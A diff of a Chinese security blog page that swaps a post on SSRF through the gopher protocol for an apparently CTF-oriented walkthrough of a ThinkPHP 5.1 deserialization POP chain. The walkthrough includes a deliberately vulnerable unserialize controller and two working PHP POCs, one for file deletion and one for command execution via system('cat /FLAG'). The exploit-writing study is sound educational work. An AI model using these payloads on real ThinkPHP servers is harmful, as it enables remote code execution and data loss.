@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ssrf-gopher协议利用, Keep-Boom">
+    <meta name="keywords" content="TP5.1反序列化漏洞, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ssrf-gopher协议利用 | Keep-Boom</title>
+    <title>TP5.1反序列化漏洞 | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -315,7 +315,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ssrf-gopher协议利用</h1>
+                    <h1 class="description center-align post-title">TP5.1反序列化漏洞</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-04-07
+                    2021-04-12
                 </div>
                 
 
@@ -459,48 +459,152 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它。</p>
-<pre><code>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。</code></pre>
-<p>Gopher协议格式</p>
-<pre><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></pre>
-<pre><code>–wite-curlwrappers：运用curl工具打开url流
-curl使用curl --version查看版本以及支持的协议</code></pre>
-<p><img src="/images/71.png"></p>
-<p>Gopher发送请求HTTP GET请求：</p>
-<p>使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求</p>
-<p>nc启动监听，监听2333端口：nc -lvp 2333</p>
-<p>使用curl发送http请求，命令为</p>
-<pre><code>root@kali ~# curl gopher://192.168.17.129:2333/abcd</code></pre>
-<p>此时nc收到的消息为：</p>
-<pre><code>root@Ubuntu ~# nc -lp 2333
-bcd</code></pre>
-<p>可以发现url中的a没有被nc接受到，如果命令变为</p>
-<pre><code>root@kali ~# curl gopher://192.168.17.129:2333/_abcd</code></pre>
-<p>此时nc收到的消息为：</p>
-<pre><code>root@Ubuntu ~# nc -lp 2333
-abcd</code></pre>
-<p>在Gopher协议中发送HTTP的数据，需要注意的是</p>
-<pre><code>1、问号（？）需要转码为URL编码，也就是%3f
-2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a
-3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）
-可以直接利用Hackbar进行编码，然后把%0a换行修改为%0d%0a即可。</code></pre>
-<p>GET数据包</p>
-<pre><code>GET /ssrf.php?name=c0tfl0g HTTP/1.1
-Host: 192.168.17.1</code></pre>
-<p>编码后</p>
-<pre><code>GET%20/ssrf.php%3fname=c0tfl0g%20HTTP/1.1%0d%0AHost:%20192.168.17.1%0d%0A</code></pre>
-<p><img src="/images/72.png"></p>
-<p>POST数据包（必须要包含最基本的4个信息）</p>
-<pre><code>POST /ssrf.php HTTP/1.1
-host:192.168.17.1
-Content-Type:application/x-www-form-urlencoded
-Content-Length:12
+                <p>s</p>
+<p>环境搭建</p>
+<p>BUU-N1BOOK[第三章 web进阶]thinkphp反序列化利用链 ，源码下载。</p>
+<p>也可以自己百度TP5.1.x的源码</p>
+<p>PHP版本7.0以上</p>
+<p>修改代码</p>
+<pre><code>&lt;?php
+namespace app\index\controller;
 
-name=c0tfl0g</code></pre>
-<p>编码后</p>
-<pre><code>POST%20/ssrf.php%20HTTP/1.1%0d%0AHost:192.168.17.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:12%0d%0A%0d%0Aname=c0tfl0g%0d%0A</code></pre>
-<p><img src="/images/73.png"></p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45089570/article/details/109643457">文章一</a></p>
+class Index
+&#123;
+    public function index()
+    &#123;
+        return &quot;&lt;a href=&#39;www.zip&#39;&gt;download code&lt;/a&gt;&quot;;
+    &#125;
+
+    public function hello()
+    &#123;
+        unserialize($_POST[&#39;str&#39;]);
+    &#125;
+&#125;</code></pre>
+<p>POP漏洞链</p>
+<p>反序列化，最先就要寻找类中的__destruct方法。</p>
+<p>在 <strong>think\process\pipes\Windows</strong> 类的 <strong>__destruct</strong> 方法中，存在一个删除文件功能，而这里的文件名 <strong>$filename</strong> 变量是可控。如果我们将一个类赋值给 <strong>$filename</strong> 变量，那么在 <strong>file_exists($filename)</strong> 的时候，就会触发这个类的 <strong>__toString</strong> 方法。因为 <strong>file_exists</strong> 函数需要的是一个字符串类型的参数，如果传入一个对象，就会先调用该类 <strong>__toString</strong> 方法，将其转换成字符串，然后再判断。</p>
+<p><img src="/images/74.png"></p>
+<p>这里有个unlink（$filename)存在任意文件删除漏洞。</p>
+<p>POC</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name">Windows</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'要删除的文件路径'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token keyword">namespace</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+</code></pre>
+<p>接下来，我们就来寻找可利用的 <strong>__toString</strong> 方法。全局搜索到的 <strong>__toString</strong> 方法其实不多，这里有两处都可以利用。它们的区别在于利用 <strong>think\Collection</strong> 构造的链要多构造一步，我们这里只分析链较短的 <strong>think\model\concern\Conversion</strong> 。</p>
+<p><img src="/images/75.png"></p>
+<p>如下图 <strong>第191-192行</strong> 所示，**$relation** 变量来自 <strong>$this-&gt;data[$name]</strong> ，而这个变量是可以控制的。<strong>第192行</strong> 的 <strong>$name</strong> 变量来自 <strong>$this-&gt;append</strong> ，也是可以控制的。所以 <strong>$relation-&gt;visible($name)</strong> 就变成了：<strong>可控类-&gt;visible(可控变量)</strong> 。那么接下来，就要找可利用的 <strong>visible</strong> 方法，或者没有 <strong>visible</strong> 方法，但有可利用的 <strong>__call</strong> 方法。</p>
+<p><img src="/images/76.png"></p>
+<p>全局搜了一下 <strong>visible</strong> 方法大概有3处，但是都不能利用，所以我们考虑寻找可利用的 <strong>__call</strong> 方法。在搜 <strong>__call</strong> 方法的时候，会发现有一处 <strong>think\Request</strong> 类比较好利用，因为这里 <strong>call_user_func_array</strong> 函数的第一个参数完全可控。构造 <strong>EXP</strong> 的时候可以传入数组，变成  <strong>call_user_func_array(array(任意类,任意方法),$args)</strong> ，这样我们就可以调用任意类的任意方法了。虽然第330行用 <strong>array_unshift</strong> 函数把本类对象 <strong>$this</strong> 放在数组变量 <strong>$args</strong> 的第一个，但是我们可以寻找不受这个参数影响的方法。</p>
+<p><img src="/images/77.png"></p>
+<p>分析过 <strong>ThinkPHP</strong> 历史 <strong>RCE</strong> 漏洞的人可能知道， <strong>think\Request</strong> 类的 <strong>input</strong> 方法经常是链中一个非常棒的 <strong>Gadget</strong> ，相当于 <strong>call_user_func($filter,$data)</strong> 。但是前面我们说过， <strong>$args</strong> 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 <strong>input</strong> 方法，而应该寻找调用 <strong>input</strong> 的方法。</p>
+<p><img src="/images/78.png"></p>
+<p>调用 <strong>input</strong> 的方法共有7处，我这里直接选择比较简单的 <strong>request</strong> 方法来分析，因为这7处关键代码都类似。如果这里通过调用 <strong>request</strong> 方法间接调用 <strong>input</strong> 方法，实际上框架会报错退出的。因为这里传给 <strong>input</strong> 方法的 <strong>$name</strong> （下图右边第1092行），实际上是先前  <strong>call_user_func_array(array(任意类,任意方法),$args)</strong> 中 <strong>$args</strong> 数组的第一个变量，即我们前面说的一个固定死的类对象。然而如果把一个类对象作为 <strong>$data</strong> 传给 <strong>input</strong> 方法，那么在强转成字符串的时候（上图左边1354行），框架就会报错退出</p>
+<p><img src="/images/79.png"></p>
+<p>所以我们这里还要继续找有哪些地方调用了这7处。这里搜了调用 <strong>param</strong> 方法的地方，发现 <strong>isAjax</strong> 和 <strong>isPjax</strong> 都可以利用，因为他们传入 <strong>param</strong> 方法的第一个参数均可控。</p>
+<p><img src="/images/80.png"></p>
+<p>这样，整个漏洞链就构造完了。下面举个例子，比如我们想执行 <strong>system(‘id’)</strong> 代码，那么我们只要让传入的 <strong>Request</strong> 对象的 <strong>$this-&gt;filter=’system’</strong> 且 <strong>$this-&gt;param=array(‘id’)</strong> 即可。</p>
+<p>流程图</p>
+<p><img src="/images/81.png"></p>
+<p>POC</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name">Windows</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>
+              <span class="token string">'yi'</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>
+                <span class="token string">'yi'</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">array</span><span class="token punctuation">(</span>
+                   <span class="token string">'hello'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'world'</span>
+                <span class="token punctuation">)</span>
+            <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">class</span> <span class="token class-name">Request</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$param</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
+            <span class="token comment" spellcheck="true">// 表单请求类型伪装变量</span>
+            <span class="token string">'var_method'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'_method'</span><span class="token punctuation">,</span>
+            <span class="token comment" spellcheck="true">// 表单ajax伪装变量</span>
+            <span class="token string">'var_ajax'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>
+            <span class="token comment" spellcheck="true">// 表单pjax伪装变量</span>
+            <span class="token string">'var_pjax'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'_pjax'</span><span class="token punctuation">,</span>
+            <span class="token comment" spellcheck="true">// PATHINFO变量名 用于兼容模式</span>
+            <span class="token string">'var_pathinfo'</span>     <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'s'</span><span class="token punctuation">,</span>
+            <span class="token comment" spellcheck="true">// 兼容PATH_INFO获取</span>
+            <span class="token string">'pathinfo_fetch'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">'ORIG_PATH_INFO'</span><span class="token punctuation">,</span> <span class="token string">'REDIRECT_PATH_INFO'</span><span class="token punctuation">,</span> <span class="token string">'REDIRECT_URL'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+            <span class="token comment" spellcheck="true">// 默认全局过滤方法 用逗号分隔多个</span>
+            <span class="token string">'default_filter'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>
+            <span class="token comment" spellcheck="true">// 域名根，如thinkphp.cn</span>
+            <span class="token string">'url_domain_root'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>
+            <span class="token comment" spellcheck="true">// HTTPS代理标识</span>
+            <span class="token string">'https_agent_name'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>
+            <span class="token comment" spellcheck="true">// IP代理获取标识</span>
+            <span class="token string">'http_agent_ip'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'HTTP_X_REAL_IP'</span><span class="token punctuation">,</span>
+            <span class="token comment" spellcheck="true">// URL伪静态后缀</span>
+            <span class="token string">'url_html_suffix'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'html'</span><span class="token punctuation">,</span>
+        <span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span><span class="token punctuation">[</span><span class="token string">'visible'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">'isAjax'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span><span class="token operator">=</span><span class="token string">"system"</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'cat /FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token keyword">namespace</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6467">https://xz.aliyun.com/t/6467</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/114975476">https://blog.csdn.net/zy15667076526/article/details/114975476</a></p>
 
             </div>
             <hr/>
@@ -526,7 +630,7 @@ name=c0tfl0g</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/04/07/ssrf-gopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/">http://example.com/2021/04/07/ssrf-gopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/</a>
+                    <a href="http://example.com/2021/04/12/TP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://example.com/2021/04/12/TP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -731,9 +835,10 @@ name=c0tfl0g</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/04/12/TP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
@@ -751,9 +856,9 @@ name=c0tfl0g</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -762,6 +867,7 @@ name=c0tfl0g</code></pre>
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -772,13 +878,13 @@ name=c0tfl0g</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/04/04/%E7%BA%A2%E6%98%8E%E8%B0%B7%E9%83%A8%E5%88%86wp/">
+                <a href="/2021/04/07/ssrf-gopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="红明谷部分wp">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="ssrf-gopher协议利用">
                         
-                        <span class="card-title">红明谷部分wp</span>
+                        <span class="card-title">ssrf-gopher协议利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -789,7 +895,7 @@ name=c0tfl0g</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-07
                             </span>
                         <span class="publish-author">
                             
